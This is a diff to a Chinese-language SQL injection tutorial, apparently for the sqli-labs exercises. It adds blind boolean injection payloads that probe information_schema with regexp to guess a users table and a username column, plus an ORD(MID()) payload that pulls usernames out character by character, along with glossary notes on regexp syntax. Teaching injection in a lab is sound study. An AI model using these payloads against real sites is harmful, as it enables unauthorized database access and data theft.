@@ -237,7 +237,17 @@ mysql> show tables;
 
 只需改`limit 1,1`
 
+(4) 猜测users表中是否存在us**的列
 
+`id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]'  limit 0,1 )  --+`
+
+(5) 猜测是否存在username列
+
+`id=1' and 1=(select 1 from information_schema.columns where table_name='users'  and column_name regexp '^username'  limit 0,1 )  --+`
+
+(6) 获取users表的内容(此处新函数较多，仔细阅读补充内容11-)
+
+`id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+`
 
 
 ## SQL数据库的补充知识
@@ -287,4 +297,19 @@ mysql> show tables;
 
 含义: 跳过前a行，取第b行
 
+10. `regexp`
+
+含义: 这是用正则表达式检查字符串是否匹配某种模式
+
+11. `^`
+
+含义: 这是正则表达式的行首锚点，表示匹配内容必须从字符串开头开始
+
+12. `'^us[a-z]'`
+
+含义: `[a-z]` 是正则表达式的字符集合，表示匹配一个小写英文字母
+
+      整句表示字符串必须以 us 开头，后面紧跟一个小写字母，例如 user_id、`usage` 会匹配；`us` 本身或 us_abc 不匹配。
+
+13. 
 
